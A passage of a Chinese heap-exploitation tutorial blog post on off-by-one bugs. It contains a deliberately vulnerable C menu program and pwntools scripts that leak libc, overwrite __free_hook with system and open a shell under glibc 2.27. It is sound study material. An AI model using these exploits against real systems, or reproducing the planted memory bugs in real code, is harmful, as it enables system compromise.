class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdint.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;assert.h&gt;</span></span></span><br><span class=\"line\"><span class=\"type\">char</span> *ptr[<span class=\"number\">0x100</span>] = &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">menu</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;1.malloc&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;2.edit&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;3.show&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;4.free&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;5.exit&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">my_malloc</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> index,size;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;index:&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%d&quot;</span>,&amp;index);</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;size:&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%d&quot;</span>,&amp;size);</span><br><span class=\"line\">    ptr[index] = <span class=\"built_in\">malloc</span>(size);</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;content:&quot;</span>);</span><br><span class=\"line\">    read(<span class=\"number\">0</span>,ptr[index],size);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">my_edit</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> index,size;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;index:&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%d&quot;</span>,&amp;index);</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;size:&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%d&quot;</span>,&amp;size);</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;content:&quot;</span>);</span><br><span class=\"line\">    read(<span class=\"number\">0</span>,ptr[index],size);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">my_free</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> index;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;index:&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%d&quot;</span>,&amp;index);</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(ptr[index]);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">my_show</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> index;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;index:&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%d&quot;</span>,&amp;index);</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(ptr[index]);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    setbuf(<span class=\"built_in\">stdin</span>, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">    setbuf(<span class=\"built_in\">stdout</span>, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;welcome&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(<span class=\"number\">1</span>)&#123;</span><br><span class=\"line\">        <span class=\"type\">int</span> op;</span><br><span class=\"line\">        menu();</span><br><span class=\"line\">        <span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%d&quot;</span>,&amp;op);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(op == <span class=\"number\">1</span>) my_malloc();</span><br><span class=\"line\">        <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(op == <span class=\"number\">2</span>) my_edit();</span><br><span class=\"line\">        <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(op == <span class=\"number\">3</span>) my_show();</span><br><span class=\"line\">        <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(op == <span class=\"number\">4</span>) my_free();</span><br><span class=\"line\">        <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(op == <span class=\"number\">5</span>) <span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">        <span class=\"keyword\">else</span> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;invalid!&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​\t这个demo里的edit可以得到任意size,但假设只能溢出1字节</p>\n<h1 id=\"利用1-扩展被释放块\"><a href=\"#利用1-扩展被释放块\" class=\"headerlink\" title=\"利用1:扩展被释放块\"></a>利用1:扩展被释放块</h1><p>​\t利用思路可以总结为通过拓展一个被释放的块,覆盖掉后面的块,<strong>可以修改后面块的内容,比如fd,bk或者函数指针等,从而可以进一步利用</strong></p>\n<p>gcc -g demo.c demo1</p>\n<p>patchelf –set-interpreter ~&#x2F;pwn&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.27-3ubuntu1_amd64&#x2F;ld-linux-x86-64.so.2 .&#x2F;demo1</p>\n<p>patchelf –set-rpath &#x2F;root&#x2F;pwn&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.27-3ubuntu1_amd64&#x2F; .&#x2F;demo1</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-29-off%E2%80%94by-one/image-20230603154728457.png\" alt=\"image-20230603154728457\"></p>\n<p>​\t\t覆盖前</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-29-off%E2%80%94by-one/image-20230603135909057.png\" alt=\"image-20230603135909057\"></p>\n<p>​\t\t覆盖后,可以修改后面的bin的内容了,然后再申请后面bin,就可以申请到free_hook等任意地址,进行修改</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-29-off%E2%80%94by-one/image-20230603135947149.png\" alt=\"image-20230603135947149\"></p>\n<p>​\t0x51的原因是  0x418 (0x410其实是) + 0x10的头 + 0x20的数据(或者说0x28) + 0x10的头</p>\n<p>​\t所以就等于0x450, 不存在0x458这种,   其实这里改成多少都行,能覆盖到就可以了</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">p = process(<span class=\"string\">&#x27;./demo1&#x27;</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">&#x27;/root/pwn/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc.so.6&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>, <span class=\"string\">&#x27;splitw&#x27;</span>, <span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(p)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">cmd</span>(<span class=\"params\">a</span>):</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;5.exit&#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(a))</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">alloc</span>(<span class=\"params\">index,size,content</span>):</span><br><span class=\"line\">    cmd(<span class=\"number\">1</span>)</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;index&#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(index))</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;size&#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;content&#x27;</span>)</span><br><span class=\"line\">    p.send(content)</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\">index,size,content</span>):</span><br><span class=\"line\">    cmd(<span class=\"number\">2</span>)</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;index&#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(index))</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;size&#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;content&#x27;</span>)</span><br><span class=\"line\">    p.send(content)</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show</span>(<span class=\"params\">index</span>):</span><br><span class=\"line\">    cmd(<span class=\"number\">3</span>)</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;index:\\n&#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(index))</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">free</span>(<span class=\"params\">index</span>):</span><br><span class=\"line\">    cmd(<span class=\"number\">4</span>)</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;index:\\n&#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(index))</span><br><span class=\"line\"></span><br><span class=\"line\">alloc(<span class=\"number\">0</span>,<span class=\"number\">0x18</span>,<span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\">alloc(<span class=\"number\">1</span>,<span class=\"number\">0x418</span>,<span class=\"string\">b&#x27;b&#x27;</span>)</span><br><span class=\"line\">alloc(<span class=\"number\">2</span>,<span class=\"number\">0x28</span>,<span class=\"string\">b&#x27;c&#x27;</span>)</span><br><span class=\"line\">free(<span class=\"number\">1</span>)</span><br><span class=\"line\">edit(<span class=\"number\">0</span>,<span class=\"number\">0x19</span>,p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span>+p8(<span class=\"number\">0x51</span>))</span><br><span class=\"line\">alloc(<span class=\"number\">3</span>,<span class=\"number\">0x448</span>,<span class=\"string\">b&#x27;\\xa0&#x27;</span>) <span class=\"comment\"># 0x440 0x448都可以,</span></span><br><span class=\"line\">free(<span class=\"number\">2</span>)</span><br><span class=\"line\">show(<span class=\"number\">3</span>)</span><br><span class=\"line\">leak_libc = u64(p.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&quot;\\x00&quot;</span>))</span><br><span class=\"line\">libc_base = leak_libc - <span class=\"number\">0x3ebca0</span> <span class=\"comment\"># main+96和libc起始位置偏移</span></span><br><span class=\"line\">free_hook = libc_base + libc.symbols[<span class=\"string\">&#x27;__free_hook&#x27;</span>]</span><br><span class=\"line\">system = libc_base + libc.symbols[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\"><span class=\"comment\">#print(hex(leak_libc))</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">edit(<span class=\"number\">3</span>,<span class=\"number\">0x448</span>,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x418</span>+p64(<span class=\"number\">0x31</span>)+p64(free_hook))</span><br><span class=\"line\">alloc(<span class=\"number\">4</span>,<span class=\"number\">0x28</span>,<span class=\"string\">b&#x27;/bin/sh&#x27;</span>)</span><br><span class=\"line\">alloc(<span class=\"number\">5</span>,<span class=\"number\">0x28</span>,p64(system))</span><br><span class=\"line\">free(<span class=\"number\">4</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#pause()</span></span><br></pre></td></tr></table></figure>\n\n<p>​\t</p>\n<p>​\t奇怪的是,这里的free(2)为什么没有被合并呢, 一般需要加一个堆块挡着</p>\n<p>​\t</p>\n<h1 id=\"利用2-扩展已分配块\"><a href=\"#利用2-扩展已分配块\" class=\"headerlink\" title=\"利用2: 扩展已分配块\"></a>利用2: 扩展已分配块</h1><p><img src=\"/pwn%E5%85%A5%E9%97%A8-29-off%E2%80%94by-one/image-20230603154943782.png\" alt=\"image-20230603154943782\"></p>\n<p>​\t\t感觉和1差不多其实,就是换一下顺序</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">p = process(<span class=\"string\">&#x27;./demo1&#x27;</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">&#x27;/root/pwn/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc.so.6&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>, <span class=\"string\">&#x27;splitw&#x27;</span>, <span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(p)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">cmd</span>(<span class=\"params\">a</span>):</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;5.exit&#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(a))</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">alloc</span>(<span class=\"params\">index,size,content</span>):</span><br><span class=\"line\">    cmd(<span class=\"number\">1</span>)</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;index&#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(index))</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;size&#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;content&#x27;</span>)</span><br><span class=\"line\">    p.send(content)</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\">index,size,content</span>):</span><br><span class=\"line\">    cmd(<span class=\"number\">2</span>)</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;index&#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(index))</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;size&#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;content&#x27;</span>)</span><br><span class=\"line\">    p.send(content)</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show</span>(<span class=\"params\">index</span>):</span><br><span class=\"line\">    cmd(<span class=\"number\">3</span>)</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;index:\\n&#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(index))</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">free</span>(<span class=\"params\">index</span>):</span><br><span class=\"line\">    cmd(<span class=\"number\">4</span>)</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;index:\\n&#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(index))</span><br><span class=\"line\"></span><br><span class=\"line\">alloc(<span class=\"number\">0</span>,<span class=\"number\">0x18</span>,<span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\">alloc(<span class=\"number\">1</span>,<span class=\"number\">0x418</span>,<span class=\"string\">b&#x27;b&#x27;</span>)</span><br><span class=\"line\">alloc(<span class=\"number\">2</span>,<span class=\"number\">0x28</span>,<span class=\"string\">b&#x27;c&#x27;</span>)</span><br><span class=\"line\">alloc(<span class=\"number\">3</span>,<span class=\"number\">0x28</span>,<span class=\"string\">b&#x27;d&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">edit(<span class=\"number\">0</span>,<span class=\"number\">0x19</span>,p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span>+p8(<span class=\"number\">0x51</span>))</span><br><span class=\"line\">free(<span class=\"number\">1</span>)</span><br><span class=\"line\">alloc(<span class=\"number\">4</span>,<span class=\"number\">0x448</span>,<span class=\"string\">b&#x27;\\xa0&#x27;</span>)</span><br><span class=\"line\">show(<span class=\"number\">4</span>)</span><br><span class=\"line\">leak_libc = u64(p.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&quot;\\x00&quot;</span>))</span><br><span class=\"line\">libc_base = leak_libc - <span class=\"number\">0x3ebca0</span> <span class=\"comment\"># main+96和libc起始位置偏移</span></span><br><span class=\"line\">free_hook = libc_base + libc.symbols[<span class=\"string\">&#x27;__free_hook&#x27;</span>]</span><br><span class=\"line\">system = libc_base + libc.symbols[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(leak_libc))</span><br><span class=\"line\">free(<span class=\"number\">2</span>)</span><br><span class=\"line\">edit(<span class=\"number\">4</span>,<span class=\"number\">0x448</span>,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x418</span>+p64(<span class=\"number\">0x31</span>)+p64(free_hook))</span><br><span class=\"line\">alloc(<span class=\"number\">5</span>,<span class=\"number\">0x28</span>,<span class=\"string\">b&#x27;/bin/sh&#x27;</span>)</span><br><span class=\"line\">alloc(<span class=\"number\">6</span>,<span class=\"number\">0x28</span>,p64(system))</span><br><span class=\"line\">free(<span class=\"number\">5</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#pause()</span></span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h1 id=\"利用3-收缩被释放块-poison-null-byte\"><a href=\"#利用3-收缩被释放块-poison-null-byte\" class=\"headerlink\" title=\"利用3: 收缩被释放块 poison null byte\"></a>利用3: 收缩被释放块 poison null byte</h1><p>​\t权威指南里面的图,还不错</p>\n<p>​\t总的俩说还是造成堆块重叠</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-29-off%E2%80%94by-one/image-20230603155836221.png\" alt=\"image-20230603155836221\"><img src=\"/pwn%E5%85%A5%E9%97%A8-29-off%E2%80%94by-one/image-20230603155842598.png\" alt=\"image-20230603155842598\"></p>\n<p>​\t\t博主的图,也不错,不过最后好像少了一块,进行了补全</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-29-off%E2%80%94by-one/2\" alt=\"img\"></p>\n<img src=\"/pwn%E5%85%A5%E9%97%A8-29-off%E2%80%94by-one/image-20230531202728221.png\" alt=\"image-20230531202728221\" style=\"zoom:50%;\">\n\n\n\n<p>free 5之前</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-29-off%E2%80%94by-one/image-20230531203121300.png\" alt=\"image-20230531203121300\"></p>\n<p>free之后tcachebin 0x50多了一项,此时利用edit修改fd,就可以实现任意地址写</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-29-off%E2%80%94by-one/image-20230531203247741.png\" alt=\"image-20230531203247741\"></p>\n<p>修改fd后,此时就可以修改hook指针getshell</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-29-off%E2%80%94by-one/image-20230531203452499.png\" alt=\"image-20230531203452499\"></p>\n<p>exp</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">p = process(<span class=\"string\">&#x27;./demo&#x27;</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">&#x27;/root/pwn/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc.so.6&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>, <span class=\"string\">&#x27;splitw&#x27;</span>, <span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(p)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">cmd</span>(<span class=\"params\">a</span>):</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;5.exit&#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(a))</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">alloc</span>(<span class=\"params\">index,size,content</span>):</span><br><span class=\"line\">    cmd(<span class=\"number\">1</span>)</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;index&#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(index))</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;size&#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;content&#x27;</span>)</span><br><span class=\"line\">    p.send(content)</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\">index,size,content</span>):</span><br><span class=\"line\">    cmd(<span class=\"number\">2</span>)</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;index&#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(index))</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;size&#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;content&#x27;</span>)</span><br><span class=\"line\">    p.send(content)</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show</span>(<span class=\"params\">index</span>):</span><br><span class=\"line\">    cmd(<span class=\"number\">3</span>)</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;index:\\n&#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(index))</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">free</span>(<span class=\"params\">index</span>):</span><br><span class=\"line\">    cmd(<span class=\"number\">4</span>)</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;index:\\n&#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(index))</span><br><span class=\"line\"></span><br><span class=\"line\">alloc(<span class=\"number\">1</span>,<span 